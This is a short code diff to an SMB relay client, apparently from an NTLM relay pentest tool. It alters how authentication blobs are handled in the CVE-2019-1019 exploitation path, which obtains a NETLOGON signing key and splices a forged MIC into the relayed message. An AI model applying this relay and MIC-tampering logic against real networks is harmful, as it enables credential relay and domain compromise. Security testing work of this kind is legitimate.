@@ -145,9 +145,9 @@ class SMBRelayClient(ProtocolClient):
         # Here we will use netlogon to get the signing session key
         logging.info("Connecting to %s NETLOGON service" % self.serverConfig.domainIp)
 
-        respToken2 = SPNEGO_NegTokenResp(authenticateMessageBlob)
+        #respToken2 = SPNEGO_NegTokenResp(authenticateMessageBlob)
         authenticateMessage = NTLMAuthChallengeResponse()
-        authenticateMessage.fromString(respToken2['ResponseToken'])
+        authenticateMessage.fromString(authenticateMessageBlob)
         _, machineAccount = self.serverConfig.machineAccount.split('/')
         domainName = authenticateMessage['domain_name'].decode('utf-16le')
 
@@ -498,8 +498,8 @@ class SMBRelayClient(ProtocolClient):
         if self.serverConfig.remove_target:
             # Trying to exploit CVE-2019-1019
             # Discovery and Implementation by @simakov_marina and @YaronZi
-            respToken2 = SPNEGO_NegTokenResp(authData)
-            authenticateMessageBlob = respToken2['ResponseToken']
+            # respToken2 = SPNEGO_NegTokenResp(authData)
+            authenticateMessageBlob = authData
 
             errorCode, signingKey = self.netlogonSessionKey(authData)
 
@@ -512,7 +512,8 @@ class SMBRelayClient(ProtocolClient):
 
             respToken2 = SPNEGO_NegTokenResp()
             respToken2['ResponseToken'] = authenticateMessageBlob[0:0x48] + relay_MIC + authenticateMessageBlob[0x58:]
-            authData = respToken2.getData()
+            authData = authenticateMessageBlob[0:0x48] + relay_MIC + authenticateMessageBlob[0x58:]
+            #authData = respToken2.getData()
 
         if self.session.getDialect() == SMB_DIALECT:
             token, errorCode = self.sendAuthv1(authData, serverChallenge)
